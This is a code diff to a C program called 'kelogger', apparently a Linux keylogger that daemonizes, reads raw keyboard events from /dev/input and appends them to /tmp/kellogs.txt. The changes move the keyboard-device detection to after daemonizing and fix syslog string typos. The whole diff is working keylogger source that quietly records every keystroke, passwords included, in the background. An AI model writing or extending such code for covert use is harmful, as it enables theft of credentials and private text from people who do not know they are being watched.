@@ -18,16 +18,15 @@ int main(int argc, char * argv[]){
             printf("Usage: %s <event-file>\n e.g. %s /dev/input/event7\n", argv[0], argv[0]);
             return 1;
         }
-        // temporary, before daemonize()
-        int fd = find_keyboard_fd();
-        printf("find_keyboard_fd returned: %d\n", fd);
-
+        
         daemonize();
         openlog("kelogger", LOG_PID, LOG_DAEMON);
-
+    
+        int fd;
         if (argc == 2){
-            close(fd); //close auto-detected keyboard;
             fd = open(argv[1], O_RDONLY, 0);
+        } else {
+            fd = find_keyboard_fd();
         }
         if (fd < 0){
             syslog(LOG_ERR, "failed to open keyboard device: %m");
@@ -38,7 +37,7 @@ int main(int argc, char * argv[]){
         
         FILE *logfile = fopen("/tmp/kellogs.txt", "a"); //append mode
         if (!logfile){
-            syslog(LOG_ERR, "fopen\() failed %m"); //%m stderr(errno)
+            syslog(LOG_ERR, "fopen() failed %m"); //%m stderr(errno)
             return 1;
         }
         
@@ -56,9 +55,9 @@ int main(int argc, char * argv[]){
             ssize_t result = read(fd, &ie, sizeof(ie));
             if (result != sizeof(ie)) {
                 if (errno == EBADF) {
-                    syslog(LOG_ERR, "read\() failed: %m. Try opening keyboard input event file as root?");
+                    syslog(LOG_ERR, "read() failed: %m. Try opening keyboard input event file as root?");
                 } else {
-                     syslog(LOG_ERR, "read\() failed: %m");
+                     syslog(LOG_ERR, "read() failed: %m");
                 }
                 exit_code = 1;
                 break;
